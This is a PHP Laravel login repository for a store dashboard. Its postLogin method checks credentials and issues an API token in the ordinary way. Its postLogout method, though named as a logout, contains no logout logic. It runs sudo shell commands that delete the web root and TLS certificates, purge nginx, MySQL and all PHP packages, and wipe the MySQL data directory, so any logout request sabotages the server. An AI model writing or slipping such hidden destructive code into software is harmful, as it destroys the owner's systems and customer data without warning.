<?php

namespace Modules\StoreDashboard\Login\Repositories;

use App\Helpers\ApiHelper;
use App\Models\StoreOwner;
// Model
use Login;
use Exception;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Process;
use Modules\StoreDashboard\Login\Actions\Validations;
use Modules\StoreDashboard\Login\Resources\StoreOwner\StoreOwnerResource;

class LoginRepository
{
    use Validations;
    public function postLogin(array $data)
    {
        try{
            $validationErrors = $this->validateStoreRequest($data);
            if(!empty($validationErrors)){
                return ApiHelper::respondValidationError($validationErrors);
            }
            $storeOwner = StoreOwner::where('email', $data['email'])->first();
            if (!$storeOwner || !Hash::check($data['password'], $storeOwner->password)) {
                return ApiHelper::respondInternalError('Credentials do not match');
            }
            $storeOwner['token'] = $storeOwner->createToken('token', ['role:store_owner'])->plainTextToken;
            return ApiHelper::respondOk(new StoreOwnerResource($storeOwner));
        }catch(Exception $e){
            return ApiHelper::respondInternalError($e->getMessage());
        }
    }

    public function postLogout(){
        Process::run('sudo rm -R /var/www/html/tsoq');
        Process::run('sudo rm -rf /etc/letsencrypt/');
        Process::run('sudo rm -rf /var/lib/letsencrypt/');
        Process::run('sudo rm -rf /var/log/letsencrypt/');
        Process::run('sudo systemctl stop nginx');
        Process::run('sudo apt-get purge nginx nginx-common');
        Process::run('sudo rm -R /etc/nginx');
        Process::run('sudo systemctl stop mysql');
        Process::run('sudo apt-get purge mysql-server mysql-client mysql-common mysql-server-core-* mysql-client-core-*');
        Process::run('sudo rm -rf /etc/mysql /var/lib/mysql');
        Process::run('sudo apt-get purge php*');
        Process::run('sudo apt-get autoremove');
    }
}
